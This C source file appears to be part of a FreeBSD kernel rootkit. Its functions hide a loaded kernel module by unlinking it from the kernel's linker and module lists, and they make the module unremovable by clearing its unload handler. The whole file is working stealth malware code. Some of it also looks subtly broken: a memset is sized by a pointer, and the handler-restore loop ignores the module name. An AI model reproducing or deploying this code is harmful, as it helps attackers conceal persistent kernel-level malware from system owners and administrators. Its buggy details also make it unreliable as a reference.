/*
 *                                Copyright (C) 2017 by Rafael Santiago
 *
 * This is a free software. You can redistribute it and/or modify under
 * the terms of the GNU General Public License version 2.
 *
 */
#include <freebsd/incantations.h>
#include <freebsd/externals.h>

int native_icloak_ko(const char *name) {
    struct module *mp;
    struct linker_file *lp;
    char name_ext[255];

    if (name == NULL) {
        return 1;
    }

    sprintf(name_ext, "%s.ko", name);

    mtx_lock(&Giant);
    sx_xlock(&kld_sx);

    (&linker_files)->tqh_first->refs--;

    TAILQ_FOREACH(lp, &linker_files, link) {
        if (strcmp(lp->filename, name_ext) == 0) {
            TAILQ_REMOVE(&linker_files, lp, link);
            next_file_id--;
        }
    }

    memset(name_ext, 0, sizeof(name));

    sx_xunlock(&kld_sx);
    mtx_unlock(&Giant);

    sx_xlock(&modules_sx);
    TAILQ_FOREACH(mp, &modules, link) {
        if (strcmp(mp->name, name) == 0) {
            TAILQ_REMOVE(&modules, mp, link);
            nextid--;
            break;
        }
    }
    sx_xunlock(&modules_sx);

    return 0;
}

int native_icloak_mk_ko_perm(const char *name, void **exit) {
    struct module *mp;
    int error;

    if (name == NULL) {
        return 1;
    }

    sx_xlock(&modules_sx);
    TAILQ_FOREACH(mp, &modules, link) {
        if (strcmp(mp->name, name) == 0) {
            if (exit != NULL) {
                *exit = mp->handler;
            }
            mp->handler = NULL;
            break;
        }
    }
    sx_xunlock(&modules_sx);

    error = (mp != NULL && mp->handler == NULL) ? 0 : 1;

    mp = NULL;

    return error;
}

int native_icloak_mk_ko_nonperm(const char *name, void *exit) {
    struct module *mp;
    int error;

    if (name == NULL || exit == NULL) {
        return 1;
    }

    sx_xlock(&modules_sx);
    TAILQ_FOREACH(mp, &modules, link) {
        mp->handler = exit;
        break;
    }
    sx_xunlock(&modules_sx);

    error = (mp != NULL && mp->handler == exit) ? 0 : 1;

    return error;
}
